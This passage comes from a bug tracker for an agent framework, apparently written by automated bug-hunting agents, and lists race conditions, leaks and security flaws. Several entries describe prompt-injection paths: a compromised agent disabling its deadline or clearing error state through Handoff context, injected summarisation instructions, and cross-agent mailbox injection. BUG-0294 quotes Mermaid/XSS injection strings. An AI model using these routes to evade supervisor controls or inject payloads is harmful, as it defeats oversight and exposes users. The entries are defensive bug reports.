- **description:** Handoff context merge at line 122 (`{ ...state.context, ...handoff.context }`) performs an unfiltered shallow merge, allowing a handing-off agent to overwrite privileged shared state fields such as `__deadlineAbsolute` or `lastAgentError`.
- **context:** When an agent executes a Handoff, `handoff.context` is spread directly into the shared `state.context` with no key filtering. An agent can craft a Handoff with `context: { __deadlineAbsolute: Infinity }` to disable deadline enforcement, or inject `lastAgentError: null` to clear error state and bypass supervisor error recovery. Since agent code can be influenced by prompt injection, this is an escalation vector: a prompt-injected agent can manipulate swarm-level control fields through the Handoff mechanism. Fix: filter handoff context keys against a denylist of privileged/internal fields (those starting with `__` or known supervisor control fields), or use an allowlist of user-defined context keys. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T20:08:29Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0310
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/streaming.ts`
- **line:** `72`
- **category:** `logic-bug`
- **description:** `TokenStreamWriter.push()` has no guard against writes after `end()`. If `push(token)` is called after `end()` and the async iterator has already returned, the token is silently queued but never consumed — permanently dropped.
- **context:** Triggered when a streaming LLM call emits a final token concurrently with a node timeout calling `end()`. The `push` method does not check `this.done` before enqueuing. Fix: add `if (this.done) return` at the top of `push()`.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0311
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/hitl/resume.ts`
- **line:** `43`
- **category:** `logic-bug`
- **description:** `evict()` sets `s.status = "expired"` then immediately deletes the entry from the Map. A subsequent `get(resumeId)` returns `null`, making the expired status unreachable via the public API — callers cannot distinguish "expired" from "never existed".
- **context:** The comment on `get()` says sessions remain visible so callers can observe final status, but that only holds for `"resumed"` sessions. Fix: keep expired sessions in the Map for a grace period before final deletion.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0312
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/coordination/pubsub.ts`
- **line:** `34`
- **category:** `race-condition`
- **description:** `publish()` iterates `this.subscribers` Map with `for...of` while subscriber handlers can call `subscribe()` or unsubscribe during delivery. New subscriptions added mid-iteration may or may not be visited in the same `publish()` call, causing non-deterministic event delivery.
- **context:** Per ECMAScript spec, entries added to a Map during `for...of` iteration will be visited if not yet passed. Handlers that add new subscriptions during delivery can receive the event that triggered them. Fix: snapshot subscribers before iterating (`[...this.subscribers.entries()]`).
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0319
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/harness/loop/experimental-executor.ts`
- **line:** `45`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `timeBudget` is used as the timeout for each individual phase (baseline, applyChanges, post-measurement) rather than a total budget, so total wall time can reach 3x the specified budget.
- **context:** A caller passing `timeBudget: 5000` expecting the experiment to complete within 5 seconds will instead see up to 15 seconds of execution, violating time expectations and potentially causing cascading timeouts.
- **hunter_found:** `2026-03-20T21:30:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0320
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/compile-ext.ts`
- **line:** `57`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `def` is double-cast via `as SwarmAgentDef<Record<string, unknown>> as any` when registering a dynamically spawned agent, completely erasing the generic state type parameter `S`.
- **context:** The registry stores the agent with the wrong state type, so `createAgentNode` receives a state typed as `Record<string, unknown>` instead of the actual swarm state type, making strongly-typed state field access invisible to the type checker.
- **hunter_found:** `2026-03-20T21:30:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0321
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/docx.ts`
- **line:** `15`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** The mammoth module is cast directly as `MammothLib` without checking for a `.default` export wrapper, so when mammoth is a CJS module loaded via ESM dynamic `import()` the `extractRawText` function resolves to undefined.
- **context:** CJS packages imported via ESM `import()` frequently expose their API under `.default`. The call to `extractRawText` will crash with "not a function" at runtime rather than surfacing a clear dependency-resolution error.
- **hunter_found:** `2026-03-20T21:30:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0322
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/agents/define-agent.ts`
- **line:** `159`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** maxTokens budget check strips toolCalls from the assistant message before breaking, producing a malformed conversation history where tool-call content has no matching toolCalls field.
- **context:** When the token budget is exceeded mid-turn, the assistant message is pushed with toolCalls removed but tool-referencing content intact. LLM APIs that validate message sequencing will reject the subsequent request.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0323
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/messages/index.ts`
- **line:** `168`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** trimMessages hoists all system messages to the front of the array regardless of their original positions, destroying positional semantics when multiple system messages are interleaved with conversation turns.
- **context:** Conversations that inject system messages mid-conversation will have their message ordering silently corrupted. The maxMessages limit also applies only to non-system messages.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0325
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/mcp/client.ts`
- **line:** `240`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** ``
- **description:** callTool casts response.result (typed unknown) directly to MCPCallToolResult with no structural validation, so a malformed MCP server response causes a runtime crash when callers destructure the result.
- **context:** Any MCP server returning a non-conforming result object will cause downstream crashes. The same unsafe cast pattern exists at line 121 for MCPInitializeResult.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0326
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/stores/src/redis/index.ts`
- **line:** `57`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Redis v4 fallback path assigns raw createClient result as RedisClient without a shim, but RedisClient.del uses rest params while redis v4 del expects an array — multi-key deletes on v4 backend will break.
- **context:** The ioredis path correctly shims del with r.del(...keys), but the redis v4 branch has no such adapter.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0327
- **status:** `pending`
- **severity:** `high`
- **file:** `src/swarm/graph.ts`
- **line:** `53`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** ``
- **description:** SwarmGraph lazily creates a RequestReplyBroker (with active setTimeout handles) and PubSub but exposes no dispose method, so discarding the graph leaks timer handles and subscriber maps indefinitely.
- **context:** In long-running processes that create and discard swarm graphs, timer handles accumulate and prevent GC of the entire graph closure.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0328
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/tools/src/stripe/index.ts`
- **line:** `59`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** ``
- **description:** loadStripeInstance creates a new Stripe SDK client on every tool invocation instead of caching, accumulating HTTP agent connection pools and socket handles over the session lifetime.
- **context:** In long-running agent sessions with many Stripe tool calls, file descriptors grow without bound, eventually causing EMFILE or connection pool exhaustion.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0329
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/tools/src/slack/index.ts`
- **line:** `40`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** ``
- **description:** loadSlackClient creates a new WebClient on every tool invocation instead of caching, accumulating HTTP agent connection pools and socket handles over the session lifetime.
- **context:** Same pattern as BUG-0328 but for Slack — per-call client creation causes socket handle growth in long-running sessions.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0330
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/coordination/request-reply.ts`
- **line:** `78`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Timeout callback and `reply()` method both check-then-mutate `req.resolved` non-atomically — if timeout fires between `reply()` capturing the resolver and setting `resolved = true`, both the rejection and resolution fire on the same Promise.
- **context:** Double-settling a Promise is silently ignored by V8, but downstream `.then()` chains may observe the resolved value after the rejection handler already ran, causing inconsistent state in request-reply coordination patterns.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0331
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/store/index.ts`
- **line:** `126`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `InMemoryStore.put()` checks `this.data.size` against `maxItems` before an `await this.embedFn()` call, then inserts after the await — concurrent `put()` calls all pass the size check before any insert, exceeding the capacity limit.
- **context:** In high-throughput agent loops that write to the store concurrently, the maxItems invariant is silently violated, causing unbounded memory growth in what is supposed to be a bounded store.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0332
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/checkpointers/redis.ts`
- **line:** `155`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `delete()` reads steps via `zrange` then issues separate `del` calls for each data key and the index key — a concurrent `put()` between the zrange and del leaves an orphaned data key with no index entry pointing to it.
- **context:** Orphaned keys accumulate in Redis over time, consuming memory that is never reclaimed. Related to but distinct from BUG-0304 (non-atomic `get()`).
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0333
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/json.ts`
- **line:** `10`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `readFile(source, "utf-8")` is called without any try/catch, so filesystem errors (ENOENT, EACCES) propagate as raw Node.js errors with no loader-level context.
- **context:** Same pattern as BUG-0270 (pdf.ts) but in the JSON loader. The CSV loader correctly wraps readFile in try/catch with a descriptive message, but the JSON loader does not.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0334
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/cli/init.ts`
- **line:** `11`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `initProject()` calls `mkdir` and five `writeFile` operations with no try/catch — filesystem errors (permission denied, disk full) propagate as unhandled rejections with raw Node.js errors instead of user-friendly CLI messages.
- **context:** Unlike other CLI commands (build, inspect) which wrap I/O in try/catch, `init` crashes with an unformatted stack trace on any filesystem error.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0335
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/harness/context-compactor.ts`
- **line:** `279`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Caller-supplied `compactInstructions` is injected verbatim into the LLM summarization prompt with no sanitization, enabling prompt injection that can manipulate context compaction output.
- **context:** An attacker who can influence harness configuration can inject instructions to exfiltrate conversation history or corrupt the compacted context fed into subsequent agent turns.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0336
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/cli/run.ts`
- **line:** `33`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** ``
- **description:** User-supplied file path from CLI arguments is passed directly to `spawn("npx", ["tsx", entryFile])` with no extension validation or cwd containment check, allowing execution of arbitrary files on the filesystem.
- **context:** Unlike `cli/inspect.ts` which enforces ALLOWED_EXTENSIONS and cwd containment, `run.ts` does neither.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0337
- **status:** `pending`
- **severity:** `low`
- **file:** `src/models/http-error.ts`
- **line:** `72`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Full upstream API error body from model providers is reflected verbatim into thrown `ModelAPIError` with no truncation or field scrubbing, potentially leaking provider-side internal details and request IDs to callers.
- **context:** If these errors propagate to HTTP responses, log sinks, or LLM context, internal provider error details are exposed.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0338
- **status:** `pending`
- **severity:** `high`
- **file:** `src/swarm/mailbox.ts`
- **line:** `44`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `formatInbox()` renders `m.from` and `m.content` from swarm messages directly into LLM context string with no sanitization, enabling cross-agent prompt injection via crafted message content.
- **context:** A compromised or malicious agent can embed LLM instruction overrides in its message content, which are injected verbatim into the receiving agent's context with no escaping or boundary markers.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0339
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/circuit-breaker.ts`
- **line:** `27`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** The `state` getter has a side effect — it mutates `this._state` from `"open"` to `"half_open"` when the reset timeout has elapsed, meaning any code that reads `state` twice can non-deterministically advance the circuit state.
- **context:** Logging, test assertions, or monitoring code that reads `state` can inadvertently trigger state transitions. State mutations should happen in `execute()`, not in a property accessor.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0340
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/circuit-breaker.ts`
- **line:** `34`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** In half_open state, the `_probeInFlight` guard between reading state and setting the flag is not atomic — two concurrent `execute()` calls can both pass the guard and both run the probe function simultaneously, violating the single-probe invariant.
- **context:** The circuit breaker is designed to allow exactly one probe request in half_open state. Concurrent probes can cause inconsistent failure counting and incorrect state transitions.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0341
- **status:** `pending`
- **severity:** `high`
- **file:** `src/hitl/interrupt.ts`
- **line:** `69`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `_installInterruptContext` uses `AsyncLocalStorage.enterWith()` which mutates the current async context globally, instead of `als.run(ctx, fn)` which creates an isolated child scope — concurrent node executions sharing a parent context will bleed interrupt state across nodes.
- **context:** Under `Promise.all` parallel node execution in Pregel, one node's interrupt context overwrites another's, causing interrupts to target the wrong node or be silently lost.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0342
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/harness/memory/scanner.ts`
- **line:** `164`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `scanDirectory` skips all files named `"INDEX.md"` at every level, but `inferTierFromPath` explicitly handles `semantic/topics/INDEX.md` as tier 2 — the scanner and tier inferrer are inconsistent, so INDEX.md memory units are never registered.
- **context:** Tier-2 semantic topic indexes are silently missing from the memory loader's unit map, making semantic memory queries incomplete.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0343
- **status:** `pending`
- **severity:** `low`
- **file:** `src/harness/safety-gate.ts`
- **line:** `86`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** ``
- **description:** When `responsePromise` rejects before the timeout fires, the catch block returns `FALLBACK_RESULT` without calling `clearTimeout(timeoutHandle)`, leaving a dangling timer.
- **context:** Same uncleaned timeout pattern as BUG-0031 (inference.ts) and BUG-0018 (experimental-executor.ts).
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0344
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/csv.ts`
- **line:** `17`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** TSV detection uses `source.endsWith(".tsv")` on the raw path, but `supports()` lowercases the extension — a file with `.TSV` extension passes `supports()` but gets parsed with comma separator instead of tab.
- **context:** TSV files with uppercase extensions are silently parsed as CSV, producing garbled data with tab characters embedded in field values.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0345
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/markdown.ts`
- **line:** `10`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `readFile` is called without try/catch, so filesystem errors propagate as raw Node.js errors with no loader-level context.
- **context:** Same pattern as BUG-0270 (pdf.ts) and BUG-0333 (json.ts). The CSV loader correctly wraps readFile but markdown does not.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0346
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/html.ts`
- **line:** `17`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `readFile` is called without try/catch, so filesystem errors propagate as raw Node.js errors with no loader-level context.
- **context:** Same missing-error-handling pattern as BUG-0270 (pdf), BUG-0333 (json), BUG-0345 (markdown).
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0347
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/stores/src/postgres/index.ts`
- **line:** `77`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `ensureSchema()` runs CREATE TABLE and CREATE INDEX as separate un-transacted queries — a failure between the two leaves the schema in a partial state with a table but no index.
- **context:** On flaky network connections to Postgres, the store can end up with a table but no index, causing slow queries on `listNamespaces` and `search`.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0348
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/harness/loop/tools.ts`
- **line:** `118`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** A local `stripProtoKeys` function declared inside the `modifiedInput` block shadows the module-level `stripProtoKeys` — the two implementations have subtly different behavior for array handling, and the shadowing is almost certainly unintentional.
- **context:** Maintenance changes to one copy will not propagate to the other, creating a divergence hazard. The outer function handles arrays differently than the inner one.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0349
- **status:** `pending`
- **severity:** `high`
- **file:** `src/swarm/compile-ext.ts`
- **line:** `68`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `spawnAgent()` and `removeAgent()` mutate the live `runner.nodes` and `runner._edgesBySource` Maps while the Pregel execution loop may be concurrently iterating those same structures.
- **context:** `streamSupersteps` iterates `ctx.nodes` and `ctx._edgesBySource` every superstep without any lock. A concurrent `spawnAgent` or `removeAgent` call during a live graph execution can add or delete entries mid-iteration, causing `NodeNotFoundError` or silently skipping a newly added agent.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0350
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/self-improvement/skill-evolver.ts`
- **line:** `86`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `recordSkillUsage` calls `splice(0, ...)` on `this.usageHistory` while `identifyWeakSkills` or `proposeSkillImprovement` may be concurrently iterating the same array.
- **context:** If `proposeSkillImprovement` (which filters `this.usageHistory`) is awaited concurrently with `recordSkillUsage` triggering splice-based eviction, the `filter` call can observe a truncated or shifted array, producing an incorrect failure list passed to the LLM.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0351
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/pregel/streaming.ts`
- **line:** `296`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Subgraph streaming hard-codes `childStreamMode: ["debug", "values"]`, ignoring the parent's actual requested stream modes and never collecting `"custom"` or `"messages"` events.
- **context:** If the parent only requested `"updates"`, the child still runs in `["debug", "values"]` mode, generating irrelevant events. More critically, `"custom"` and `"messages"` events emitted inside a subgraph are never surfaced because `modeCustom` and `modeMessages` checks on `allSubgraphEvents` always yield nothing.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0352
- **status:** `pending`
- **severity:** `high`
- **file:** `src/swarm/factories.ts`
- **line:** `743`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `buildDag` directly mutates private `(swarm.inner as any).edges = []` to rewire graph topology after `addAgent`, but does not clear other internal state (`conditionalEdges`, `pathMaps`) that `addAgent` may have registered.
- **context:** Clearing only `edges` leaves dangling references in other internal structures that can cause `NodeNotFoundError` or silently skip nodes during execution. The same pattern at line 854 in `buildPool` has the same risk.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0353
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/hitl/resume.ts`
- **line:** `26`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `HITLSessionStore` uses lazy eviction with no background timer, allowing resumed sessions past their TTL to accumulate in the `sessions` Map indefinitely if no new operations trigger `evict()`.
- **context:** The `evict()` method is only called from `record()`, `get()`, `getByThread()`, and `pendingCount()` — not from `all()` or `markResumed()`. In a long-lived process where sessions are created and marked resumed but no further HITL operations arrive, the map grows without bound.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0354
- **status:** `pending`
- **severity:** `low`
- **file:** `src/swarm/pool.ts`
- **line:** `208`
- **category:** `dead-code`
- **reopen_count:** `0`
- **branch:** ``
- **description:** The `if (!total) return null` guard in `pickSlot()` round-robin case is unreachable because `available.length` was already verified non-empty on line 201.
- **context:** The early return on line 201 (`if (!available.length) return null`) guarantees `total` is always >= 1 when the round-robin case is reached, making the `!total` check dead code.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0355
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/stores/src/redis/index.ts`
- **line:** `191`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Three `void this.client.zrem()` calls in `list()` fire Redis cleanup operations as floating promises with no error handling.
- **context:** When a data key has expired or is corrupt, stale sorted-set index entries are pruned via fire-and-forget `zrem`. If Redis connection is interrupted, the error is swallowed and phantom keys persist in `list()` results on every subsequent call.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0356
- **status:** `pending`
- **severity:** `medium`
- **file:** `packages/stores/src/postgres/index.ts`
- **line:** `185`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Bulk expired-row cleanup in `PostgresStore.list()` uses `void this.client.query()` with no error handling.
- **context:** When `list()` finds expired rows it fires a DELETE query as a floating promise. If the DELETE fails, the error is silently lost and expired rows accumulate, affecting subsequent `list()` and `search()` calls.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0357
- **status:** `pending`
- **severity:** `low`
- **file:** `packages/stores/src/postgres/index.ts`
- **line:** `125`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Single expired-row cleanup in `PostgresStore.get()` uses `void this.client.query()` with no error handling.
- **context:** When `get()` detects an expired row it fires a DELETE as a floating promise. The caller still gets `null` so behavior is correct, but the expired row is never deleted and re-triggers the same silent failure on every subsequent `get()`.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

<!-- HUNTER: Append new bugs above this line -->

### BUG-0294
- **status:** `reopened`
- **severity:** `medium`
- **file:** `src/graph.ts`
- **line:** `216`
- **category:** `security-injection`
- **description:** `StateGraph.toMermaid()` embeds raw node names into Mermaid markup via `lbl(n as string)` without sanitization, enabling Mermaid injection via crafted node names containing newlines and embedded directives.
- **context:** BUG-0292 fix applied `sanitizeMermaid()` to `src/swarm/compile-ext.ts` but missed `StateGraph.toMermaid()` in `src/graph.ts`. The `lbl()` helper at line 218-219 casts node names directly to string with no escaping. A crafted node name such as `"node\nstyle node fill:#ff0000\ninjected_directive"` or `'node\nclick node call alert("XSS")'` injects arbitrary Mermaid directives into the output. Since Mermaid diagrams are rendered in web UIs, this can enable XSS in environments that render the diagram. Two regression tests in `src/__tests__/mermaid-node-injection.test.ts` confirm this: "BUG-0292: crafted node ID containing newline should not inject Mermaid directives" and "BUG-0292: crafted node ID containing Mermaid click directive should be escaped" both fail. Fix: import `sanitizeMermaid` from `./inspect.js` and apply it in `lbl()` for non-START/non-END nodes. OWASP A03:2021 - Injection.
- **reopen_count:** `2`
- **branch:** `bugfix/BUG-0294`
- **hunter_found:** `2026-03-20T05:23:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T22:05:00Z`
- **validator_completed:** `2026-03-20T22:05:00Z`
